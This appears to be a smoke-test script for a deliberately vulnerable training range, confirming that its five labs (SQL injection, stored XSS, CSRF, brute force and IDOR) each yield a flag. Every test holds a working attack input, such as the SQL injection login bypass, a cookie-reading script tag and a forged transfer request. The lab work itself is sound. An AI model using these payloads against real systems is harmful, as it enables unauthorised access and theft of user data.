"""冒烟测试：验证五个靶场都能拿到 flag（用 Flask 测试客户端，无需启动服务器）。

运行：python smoke_test.py
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app import app  # noqa: E402
from flags import BRUTE_FLAG, CSRF_FLAG, IDOR_FLAG, SQLI_FLAG, XSS_FLAG  # noqa: E402


def test_sqli():
    c = app.test_client()
    r = c.post("/lab/sqli", data={"username": "admin' --", "password": "x"})
    assert SQLI_FLAG.encode() in r.data, "SQL 注入 flag 未获取到"
    print("[OK] SQL 注入:", SQLI_FLAG)


def test_xss():
    c = app.test_client()
    payload = "<script>alert(document.cookie)</script>"
    c.post("/lab/xss", data={"author": "tester", "content": payload})
    r = c.get("/lab/xss")
    cookies = "; ".join(r.headers.getlist("Set-Cookie"))
    assert XSS_FLAG in cookies, "XSS flag 未写入 Cookie"
    assert payload.encode() in r.data, "留言未按原样渲染（漏洞不存在？）"
    print("[OK] 存储型 XSS:", XSS_FLAG)


def test_csrf():
    c = app.test_client()
    c.post("/lab/csrf", data={"action": "login", "name": "alice"})
    c.post("/csrf/transfer", data={"to": "hacker", "amount": "100000"})
    c.post("/lab/csrf", data={"action": "login", "name": "hacker"})
    r = c.get("/lab/csrf")
    assert CSRF_FLAG.encode() in r.data, "CSRF flag 未获取到"
    print("[OK] CSRF:", CSRF_FLAG)


def test_brute():
    c = app.test_client()
    # victim 的弱口令 123456，模拟 Burp 爆破出的正确密码
    r = c.post("/lab/brute", data={"username": "victim", "password": "123456"})
    assert BRUTE_FLAG.encode() in r.data, "暴力破解 flag 未获取到"
    print("[OK] 暴力破解:", BRUTE_FLAG)


def test_idor():
    c = app.test_client()
    c.post("/lab/idor", data={"action": "login"})  # 以 alice(id=1) 登录
    r = c.get("/idor/profile?id=2")  # 越权访问 admin(id=2)
    assert IDOR_FLAG.encode() in r.data, "IDOR flag 未获取到"
    print("[OK] IDOR 越权:", IDOR_FLAG)


if __name__ == "__main__":
    test_sqli()
    test_xss()
    test_csrf()
    test_brute()
    test_idor()
    print("\n[PASS] 五个 flag 全部获取成功，靶场工作正常。")
